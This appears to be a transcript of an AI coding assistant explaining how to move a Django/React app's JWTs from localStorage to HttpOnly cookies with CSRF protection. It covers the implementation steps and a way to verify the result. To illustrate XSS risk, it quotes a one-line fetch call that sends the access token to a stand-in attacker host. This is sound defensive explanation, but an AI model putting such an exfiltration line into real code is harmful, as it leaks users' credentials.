Here's a clear breakdown of the current situation, the vulnerability, and what the migration would involve.

  ---
  The Current Setup

  Your app stores both the access token and refresh token in localStorage:

  - AuthContext.tsx:66-67 — tokens written to localStorage on login
  - apiClient.ts:10 — access token read from localStorage on every request
  - apiClient.ts:39 — refresh token read from localStorage when refreshing

  The token is then sent as an Authorization: Bearer <token> header with each request.

  ---
  The XSS Vulnerability

  localStorage is accessible to any JavaScript running on the page — including malicious scripts injected via XSS (cross-site scripting). If an attacker finds a way
  to inject JS into your app (e.g. through an unsanitized input, a compromised npm package, or a browser extension exploit), they can do:

  fetch("https://attacker.com/steal?t=" + localStorage.getItem("accessToken"))

  With your current token lifetimes (ACCESS_TOKEN_LIFETIME: 60 minutes, REFRESH_TOKEN_LIFETIME: 90 days), an attacker who steals the refresh token owns the account
  for up to 90 days. Since BLACKLIST_AFTER_ROTATION is False, there's no way to invalidate stolen tokens server-side either.

  ---
  What HttpOnly Cookies Are

  An HttpOnly cookie is set by the server with a flag that tells the browser: "do not let JavaScript read this cookie." It's still sent automatically with requests
  to the same origin, but it's invisible to document.cookie and therefore invisible to XSS payloads.

  The flow changes like this:

  ┌──────────────────┬──────────────────────────────────┬─────────────────────────────────┐
  │                  │      Current (localStorage)      │         HttpOnly Cookie         │
  ├──────────────────┼──────────────────────────────────┼─────────────────────────────────┤
  │ Token stored     │ In JS-accessible localStorage    │ In browser cookie jar, JS-blind │
  ├──────────────────┼──────────────────────────────────┼─────────────────────────────────┤
  │ Token sent       │ Manually in Authorization header │ Automatically by browser        │
  ├──────────────────┼──────────────────────────────────┼─────────────────────────────────┤
  │ Stealable by XSS │ Yes                              │ No                              │
  └──────────────────┴──────────────────────────────────┴─────────────────────────────────┘

  ---
  The New Problem: CSRF

  Here's the tradeoff. When cookies are sent automatically by the browser, a different attack becomes possible: CSRF (Cross-Site Request Forgery). An attacker on
  evil.com can craft a form that submits to your API, and the browser will helpfully attach the auth cookie — the user's browser does the attacker's dirty work.

  Your Django app already has CsrfViewMiddleware enabled (settings.py:75), but right now it's mostly irrelevant for your API — JWT via Authorization header is
  inherently CSRF-safe because a malicious third-party site can't set that header. Once you switch to cookies, CSRF protection becomes critical.

  Django handles this with a CSRF token: a separate, JS-readable value (not HttpOnly) that must be included in every mutating request (POST, PUT, PATCH, DELETE). The
   browser sends both the auth cookie (automatically) and the CSRF token (via JS), and the server validates both. evil.com can't read the CSRF token from your
  domain, so the attack fails.

  Your frontend would need to read the CSRF cookie and include it as a header (X-CSRFToken) on every non-GET request.

  ---
  What Would Actually Need to Change

  Backend (Django):
  - The login endpoint would need to call response.set_cookie() with httponly=True, secure=True (HTTPS only), and samesite='Lax' instead of returning tokens in the
  JSON body
  - The token refresh endpoint would read/write cookies rather than accepting a JSON body
  - The JWTAuthentication class would need to be replaced or subclassed to read the token from the cookie instead of the Authorization header
  - CSRF protection needs to be explicitly enforced on all mutation endpoints

  Frontend:
  - Remove all localStorage.getItem/setItem for tokens
  - Remove the manual Authorization: Bearer header injection in apiClient.ts:57
  - Add CSRF token reading (from the csrftoken cookie Django sets) and include it as a header on writes
  - The refresh logic in apiClient.ts changes significantly — the browser sends the refresh cookie automatically, so the frontend just hits the refresh endpoint and
  lets the server swap the cookies

  ---
  Summary of Tradeoffs

  ┌───────────────────────────┬────────────────────────────────────┬───────────────────────────────────────────┐
  │          Concern          │            localStorage            │              HttpOnly Cookie              │
  ├───────────────────────────┼────────────────────────────────────┼───────────────────────────────────────────┤
  │ XSS token theft           │ Vulnerable                         │ Protected                                 │
  ├───────────────────────────┼────────────────────────────────────┼───────────────────────────────────────────┤
  │ CSRF attacks              │ Protected (header can't be forged) │ Requires explicit CSRF handling           │
  ├───────────────────────────┼────────────────────────────────────┼───────────────────────────────────────────┤
  │ Implementation complexity │ Simpler                            │ More involved                             │
  ├───────────────────────────┼────────────────────────────────────┼───────────────────────────────────────────┤
  │ Token refresh             │ Frontend reads/stores new token    │ Server swaps cookies, frontend is passive │
  ├───────────────────────────┼────────────────────────────────────┼───────────────────────────────────────────┤
  │ Logout                    │ Clear localStorage                 │ Server must explicitly expire the cookie  │
  └───────────────────────────┴────────────────────────────────────┴───────────────────────────────────────────┘

  The HttpOnly cookie approach is generally considered the more secure production posture. The CSRF risk it introduces is manageable — Django already has the
  infrastructure for it — but it requires careful wiring on both sides.

✻ Crunched for 6m 23s

● Background command "grep -r "X-Frame\|X-Content\|Strict-Transport" "C:\Users\ethan\coding\futureflower" --include="*.py" --include="*.ts"" completed (exit code 0)

● Read 1 file (ctrl+o to expand)

● All the matches are from Django's own source files inside venv/ and frontend node_modules/ — nothing in your actual application code. This confirms that none of
  those security headers (X-Frame-Options, X-Content-Type-Options, Strict-Transport-Security) are explicitly configured in your project's settings.py.

  They would only be active if Django's middleware activates them by default:

  - X-Frame-Options: DENY — set by XFrameOptionsMiddleware, which you'd need to have in your MIDDLEWARE list
  - X-Content-Type-Options: nosniff and Strict-Transport-Security — set by SecurityMiddleware, which you do have in your middleware stack (settings.py:72)

  SecurityMiddleware only sends Strict-Transport-Security if SECURE_HSTS_SECONDS is set in settings (it defaults to 0, i.e. off). So in practice, you're likely only
  getting X-Content-Type-Options: nosniff from SecurityMiddleware out of the box, and no HSTS unless you've explicitly configured it.

  This is tangentially related to the HttpOnly cookie discussion — if you do migrate to cookies, you'd want SECURE_SSL_REDIRECT = True and SECURE_HSTS_SECONDS set in
   production, since secure=True on cookies only works over HTTPS.

❯ okay so explain to me your reccomendation. and the steps to implement it.

● Recommendation: Migrate to HttpOnly Cookies

  Yes, I'd recommend making the switch. Your refresh token lifetime is 90 days — that's a long window of exposure if localStorage is ever compromised. The migration
  is well-understood and Django has good built-in support for it.

  ---
  Implementation Steps

  1. Backend: Custom Token Endpoint (Login)

  The login view currently returns { access, refresh, user } as JSON. You'd change it so that instead of putting the tokens in the response body, it calls
  response.set_cookie() twice — once for the access token, once for the refresh token — with these flags:
  - httponly=True — blocks JS access
  - secure=True — HTTPS only
  - samesite='Lax' — CSRF mitigation at the browser level
  - appropriate max_age values matching your existing token lifetimes

  The response body would only return the user object (the frontend still needs that for rendering the UI).

  ---
  2. Backend: Custom JWT Authentication Class

  Right now JWTAuthentication from simplejwt looks for the token in the Authorization: Bearer header. You'd subclass it to instead read from the cookie. Django REST
  Framework's authentication system is designed for this — you just override one method. This class gets registered in settings.py under
  DEFAULT_AUTHENTICATION_CLASSES.

  ---
  3. Backend: Token Refresh Endpoint

  The current refresh endpoint accepts { refresh } in the request body. You'd replace or wrap it so it reads the refresh token from the cookie and writes a new
  access token back as a cookie. The frontend sends an empty POST and just waits for the server to swap the cookies.

  ---
  4. Backend: Logout Endpoint

  Right now logout is purely frontend — it just clears localStorage. With cookies, you need a real logout endpoint that calls response.delete_cookie() on both
  cookies. Otherwise the browser keeps the cookies and the user isn't actually logged out.

  ---
  5. Backend: CSRF Configuration

  This is the critical new concern. You'd need to:
  - Make sure CsrfViewMiddleware is active (it already is)
  - Make sure Django sets the csrftoken cookie — it does this automatically once CSRF middleware is active and a view is rendered, but API views may need
  @ensure_csrf_cookie to force it on the first load
  - Decide which endpoints are exempt (generally only GET endpoints are safe to exempt; all mutations need the CSRF token)

  ---
  6. Frontend: Remove All localStorage Token Logic

  - Remove localStorage.getItem/setItem calls in AuthContext.tsx:66-67 and apiClient.ts:10,39
  - Remove the Authorization: Bearer header injection in apiClient.ts:57
  - The browser now handles sending the auth cookie automatically — the frontend doesn't touch tokens at all

  ---
  7. Frontend: Add credentials: 'include' to Fetch Calls

  By default, fetch does not send cookies cross-origin. Even same-origin, you need to confirm cookies are being sent. The safe habit is to add credentials: 'include'
   to all API calls in apiClient.ts. This tells the browser to include cookies with every request.

  ---
  8. Frontend: CSRF Token Handling

  Django sets a csrftoken cookie that is JS-readable (not HttpOnly — intentionally). Your frontend needs to read this cookie and include it as an X-CSRFToken header
  on every POST, PUT, PATCH, and DELETE request. This would be a small utility function added to apiClient.ts.

  ---
  9. Frontend: Update Refresh Logic

  The refresh flow in apiClient.ts:17-25 currently reads the refresh token from localStorage and sends it in the request body. You'd simplify this: just POST to the
  refresh endpoint with credentials: 'include'. No token to read, no token to store — the server handles it entirely. The 401 retry logic stays the same.

  ---
  10. Settings: Production Cookie Security

  In settings.py, set:
  - SESSION_COOKIE_SECURE = True
  - CSRF_COOKIE_SECURE = True
  - SECURE_SSL_REDIRECT = True
  - SECURE_HSTS_SECONDS to something reasonable (e.g. 31536000 for a year)

  These ensure cookies are only sent over HTTPS and the browser enforces it.

  ---
  Order of Operations

  The steps have dependencies, so I'd do them in this order:

  1. Backend steps 1-5 first (get the server working with cookies)
  2. Test with a tool like Postman/curl to confirm cookies are being set
  3. Frontend steps 6-9 (update the client to match)
  4. Settings step 10 last, and only in production

  The trickiest part is step 2 (the custom auth class) and step 5 (CSRF wiring) — everything else is fairly mechanical once those are right.

✻ Cogitated for 31s

❯ okay so that sounds good. how do we verify that we are secure once you are done? answer that and then you may go ahead. i approve your plan

● Verification Plan

  Once the implementation is done, here's how you'd verify it's actually secure:

  1. Browser DevTools — the most important check
  - Log in, then open DevTools → Application → Cookies
  - You should see the auth cookies listed there with the HttpOnly flag checked
  - Open DevTools → Console and run document.cookie — the auth cookies should not appear. If they do, something is wrong.

  2. Check the Authorization header is gone
  - DevTools → Network tab, make any authenticated API request
  - Inspect the request headers — there should be no Authorization: Bearer header
  - Instead, you'll see the cookies being sent automatically in the Cookie header

  3. Verify CSRF protection is working
  - Make a POST request to a mutation endpoint without the X-CSRFToken header (e.g. using curl or Postman, omitting the header)
  - Django should return a 403 Forbidden. If it returns 200, CSRF isn't being enforced.

  4. Verify logout actually expires the cookie
  - Log out, then check DevTools → Application → Cookies — the auth cookies should be gone
  - Also try hitting an authenticated endpoint after logout — it should return 401

  5. Check cookie flags in the response
  - In Network tab, look at the Set-Cookie response header on login
  - Confirm it shows HttpOnly; Secure; SameSite=Lax

  6. Verify the old localStorage path is dead
  - After login, DevTools → Application → Local Storage — no tokens should be stored there
